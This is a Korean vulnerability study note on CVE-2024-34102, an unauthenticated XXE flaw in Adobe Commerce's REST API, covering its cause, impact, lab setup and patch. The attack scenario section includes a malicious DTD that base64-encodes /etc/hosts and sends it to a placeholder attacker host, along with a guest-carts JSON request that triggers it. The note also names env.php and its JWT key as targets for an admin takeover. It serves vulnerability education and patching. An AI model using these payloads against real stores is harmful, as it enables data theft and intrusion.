# 취약점 개요

## 📋 설명

Adobe Commerce(Magento Enterprise)는 전 세계 약 4만여 개 전자상거래 사이트에서 사용되는 대규모 PHP 기반 플랫폼입니다.

2024년 6월 공개된 CVE-2024-34102는 Adobe Commerce의 REST API에서 발생하는 XXE(XML External Entity Injection) 취약점으로, JSON으로 전달된 데이터가 내부적으로 XML 객체로 역직렬화되는 과정에서 필터링이 부족하여 발생합니다.

결과적으로 공격자는 인증 없이 서버가 내부적으로 호출하는 XML 엔진을 조작하여 `/etc/hosts`, `app/etc/env.php` 등의 민감 시스템 파일을 탈취하거나, 내부 네트워크로 SSRF를 수행할 수 있습니다.

Adobe는 실제로 해당 취약점이 제한적으로 악용되었다고 공식 발표하였습니다.

## ⚠️ 왜 위험한가?

**인증 불필요 (Anonymous API)**: `/rest/V1/guest-carts/...` 경로는 누구나 접근 가능 → 공격 난이도 극히 낮음

**XXE로 인한 민감 정보 유출**: `/etc/hosts`, `/app/etc/env.php` → JWT 서명 키 포함, DB 접속 정보

**추가 공격 체인 가능**: 특히 JWT 키 유출 시 임의 JWT 생성 → 관리자 API 접근 → 주문 조회/수정/환불/배송 등 무단 실행

**광범위한 영향**: 미국, 유럽 등 약 4만 개 전자상거래 사이트가 잠재적 위험에 노출

**실제 악용 사례**: Adobe는 실제로 해당 취약점이 제한적으로 악용되었다고 공식 발표

---

## 취약점 정보

| 항목           | 내용                                                      |
| -------------- | --------------------------------------------------------- |
| CVSS 점수      | 9.8 (Critical)                                           |
| 취약점 유형    | XXE → 민감 정보 유출, SSRF, 인증 우회 기반 API 남용       |
| 영향 버전      | Adobe Commerce / Magento Open Source 2.4.6~2.4.7 계열     |
| 공격 난이도    | Low (인증 불필요, JSON만 전송하면 됨)                     |
| 공개일         | 2024년 6월 13일                                           |
| 영향 범위       | 미국, 유럽 등 약 4만 개 전자상거래 사이트                 |

## 🧠 핵심 원인: JSON → 객체 매핑 과정에서 XML 파싱 발생

Adobe Commerce의 REST API는 JSON 데이터를 내부 PHP 객체로 역직렬화합니다.

문제는 이 과정에서 특정 필드(`sourceData`)가 `SimpleXMLElement` 클래스 인스턴스로 처리되며 XML 파싱이 수행된다는 것입니다.

즉, **JSON → PHP Object → XML 파서 SimpleXMLElement 호출**이라는 구조적 취약점이 존재합니다.

### 핵심 요약

- JSON 필드가 PHP 클래스의 생성자 인수와 매칭되면
- → 내부적으로 `SimpleXMLElement` 생성자 호출
- `SimpleXMLElement`는 외부 엔티티를 해석할 수 있음
- → XXE 발생
- 읽은 결과가 응답으로 그대로 반환
- → `/etc/hosts`, JWT key 등 유출 가능

## 🧩 동작 원리 도식

```
[공격자 JSON]
     ↓
ServiceInputProcessor::_createFromArray()
     ↓ JSON 필드 중 sourceData → SimpleXMLElement 선택
SimpleXMLElement($xml_data, LIBXML_NOENT | PARSEHUGE)
     ↓
XML External Entity 처리
     ↓
외부 엔티티 참조 → 내부 파일 읽기
     ↓
Adobe Commerce 서버가 응답으로 결과 반환
```

---

# 공격 시나리오

**Step 1. 공격자가 악성 XML 반환 서버 준비**

SSRFUtility나 장비를 사용해 다음 XML을 반환:

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://ATTACKER/%data;'>">
%param1;
```

**Step 2. Adobe Commerce에 JSON 요청 전송**

경로 예시:

```http
POST /rest/V1/guest-carts/ID/estimate-shipping-methods
```

JSON Body:

```json
{
  "address": {
    "sourceData": "<!DOCTYPE r [<!ENTITY % sp SYSTEM 'https://attacker/dtd.xml'> %sp;]><r/>",
    "options": 524290
  }
}
```

**Step 3. 서버 내부 XML 엔진이 악성 DTD를 해석**

→ `/etc/hosts` Base64 형태로 공격자에게 유출

**Step 4. JWT key 등 다른 민감 파일 탈취**

→ 관리자 API 권한 획득 가능

---

# 실습 환경 구성

| 역할        | 구성                                    | IP |
| ----------- | --------------------------------------- | -- |
| 피해자 서버 | Adobe Commerce 2.4.6~2.4.7 (취약 버전) | -  |
| 공격자      | Kali Linux                              | -  |

## 사전 준비사항

- Adobe Commerce 취약 버전 설치
- 기본적인 HTTP 요청 지식 (curl 또는 Burp Suite)
- XXE 공격 기법 이해
- JSON/XML 구조 이해

---

# 취약점 상세 분석

## ① 인증 없는 REST API 경로 존재

`webapi.xml`에 명시:

```xml
resources ref="anonymous"
```

→ 인증 없이 누구나 호출 가능.

해당 경로:

- `/rest/V1/guest-carts/:id/estimate-shipping-methods`
- `/rest/V1/guest-carts/:id/billing-address`

## ② JSON → 객체 역직렬화 중 XML 객체 생성

`ServiceInputProcessor::_createFromArray()`

→ JSON 필드 이름이 PHP 클래스 생성자 인수와 일치할 경우 `convertValue()` → `processComplexTypes()` 거쳐

→ `SimpleXMLElement` 생성됨.

⚠️ `SimpleXMLElement`는 외부 엔티티를 기본적으로 허용.

## ③ SimpleXMLElement 생성자 옵션이 더 위험함

PDF 기준 확인된 옵션:

- `LIBXML_NOENT` (2)
- `LIBXML_PARSEHUGE` (524288)

→ `options = 524290` (둘의 합)

이 옵션 조합은 "외부 엔티티 처리" + "제한 없는 파싱"이 가능하므로 XXE 공격이 정교하게 동작합니다.

## 💥 공격 영향

### 1) 운영자 API 권한 남용

JWT 서명 키를 `env.php`에서 추출 가능 →

정상 관리자 토큰과 동일한 JWT 생성 가능.

→ 재고·주문·고객정보 무단 접근

### 2) 서버 내부 파일 접근

`file://` wrapper, `php://filter` 등 다양한 schema 사용 가능.

### 3) 추가 취약점 체인

glibc(CVE-2024-2961)와 결합 시

→ `php://filter` 변조 → 메모리 오염 → 서비스 장애 발생 가능

---

# 패치 정보

## 안전한 버전

- **Adobe Commerce 2.4.7-p1 이상**

Adobe는 2024년 6월에 패치 버전 2.4.7-p1을 발표했습니다.

## 패치 핵심

`_createFromArray()` 내부에 필터 추가

→ `SimpleXMLElement`, `DOMElement`가 역직렬화 과정에 등장하면 즉시 예외 처리

공격 시:

```
Invalid data type: SimpleXMLElement is not allowed
```

## 공식 패치 설치 순서

1. maintenance mode 활성화
2. 패치 적용
3. 캐시 정리
4. 디버그/로그 확인
5. maintenance mode 해제

---

# 학습 포인트 (CVE 학습자용 요약)

## 🔹 XML 기반 변환 로직이 숨어 있는 JSON API는 매우 위험할 수 있다

Adobe Commerce는 JSON API이지만 내부적으로 XML 변환을 사용했습니다.

## 🔹 객체 매핑(역직렬화)이 복잡한 시스템은 공격에 취약

재귀적으로 클래스가 호출되면서 `SimpleXMLElement`에 도달하는 구조는 전형적 취약 구조.

## 🔹 XXE는 단순 파일 읽기 이상이다

JWT 키, DB Config, Credential 탈취 가능 → 권한 상승 및 지속 공격

## 🔹 LIBXML 옵션 조합은 항상 점검해야 한다

NOENT, PARSEHUGE는 대부분의 XXE 취약점에서 핵심적인 원인.

---

# 참고 자료

- [Adobe Security Advisory APSB24-40](https://helpx.adobe.com/security/products/magento/apsb24-40.html)

- [GitHub 패치 diff](https://github.com/)

- [Assetnote 연구 보고서](https://www.assetnote.io/)

- [PHP 공식 문서 simpleXMLElement](https://www.php.net/manual/en/class.simplexmlelement.php)

- [RFC3470 XML 보안 권고안](https://www.rfc-editor.org/rfc/rfc3470)

